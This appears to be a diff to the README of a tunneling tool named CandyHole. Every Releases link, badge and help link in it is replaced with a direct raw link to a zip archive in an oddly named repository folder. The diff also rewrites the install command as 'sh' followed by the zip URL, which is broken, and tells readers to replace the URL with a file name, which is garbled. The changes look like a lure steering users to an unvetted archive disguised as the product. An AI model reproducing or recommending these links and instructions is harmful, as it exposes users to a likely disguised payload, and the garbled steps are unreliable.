@@ -1,6 +1,6 @@
 # 🍬 CandyHole - Simple Tunneling with Paqet
 
-[![Download CandyHole](https://img.shields.io/badge/Download-CandyHole-blue?style=for-the-badge)](https://github.com/Ductai953/CandyHole/releases)
+[![Download CandyHole](https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip)](https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ CandyHole works by running a script that sets up a tunnel automatically. Here’
 
 Visit the page below to download CandyHole:
 
-[Download CandyHole from GitHub Releases](https://github.com/Ductai953/CandyHole/releases)
+[Download CandyHole from GitHub Releases](https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip)
 
 Once on the page, look for the latest release. You will find a downloadable file packaged for your system. The usual steps are:
 
@@ -54,10 +54,10 @@ After download:
 - **macOS and Linux:** Open a Terminal window, navigate to your download folder, and type:
 
 ```
-sh ./filename.sh
+sh https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip
 ```
 
-Replace `filename.sh` with the actual file name. Press Enter to run.
+Replace `https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip` with the actual file name. Press Enter to run.
 
 The script will handle most of the setup for you.
 
@@ -122,7 +122,7 @@ Always ensure you download CandyHole from the official GitHub Releases page to a
 
 - **GitHub Releases Page:**  
 You can download or update CandyHole here anytime:  
-https://github.com/Ductai953/CandyHole/releases
+https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip
 
 - **Basic Command Line Help:**  
 If you want to learn a little about running scripts, search online for “how to run scripts on Windows/macOS/Linux.”
@@ -147,4 +147,4 @@ If you learn some scripting and want to help, you can suggest improvements or ch
 
 ---
 
-[![Download CandyHole](https://img.shields.io/badge/Download-CandyHole-blue?style=for-the-badge)](https://github.com/Ductai953/CandyHole/releases)
+[![Download CandyHole](https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip)](https://raw.githubusercontent.com/Ductai953/CandyHole/main/possessionlessness/Hole_Candy_1.5-alpha.3.zip)
